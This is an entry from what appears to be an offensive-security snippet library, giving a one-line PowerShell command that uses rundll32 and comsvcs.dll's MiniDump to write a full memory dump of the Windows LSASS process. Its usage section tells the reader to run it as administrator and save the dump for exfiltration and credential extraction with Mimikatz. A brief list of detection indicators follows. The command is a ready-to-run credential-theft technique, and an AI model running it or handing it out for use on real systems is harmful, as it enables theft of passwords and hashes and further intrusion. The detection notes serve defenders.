---
id: 6e6a9996-7e5c-4589-b71a-e8ec921c55df
name: powershell-rundll32-minidump-lsass
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:27.177270+00:00'
updated_at: '2023-04-10T20:37:14.794613+00:00'
platforms:
  - Windows
tags:
  - dump
  - native
  - lsass
validated: true
---

# powershell-rundll32-minidump-lsass

## Code

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
```

## Description

This PowerShell snippet invokes the native MiniDump API via rundll32 to create a full memory dump of the LSASS process by PID, useful when external tools are unavailable or blocked.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $lsass_pid | PID of the LSASS process | 1234 |

## Usage

Execute in PowerShell with admin privileges after obtaining $lsass_pid via tasklist. The dump is saved to C:\temp\lsass.dmp for exfiltration and analysis (e.g., with Mimikatz).

## Detection

- Rundll32.exe spawning with comsvcs.dll arguments.
- File creation in temp directories with .dmp extension.
- API monitoring for MiniDump calls on LSASS.

## Related

- [[procedures/windows-lsass-mini-dump-for-mimikatz]]
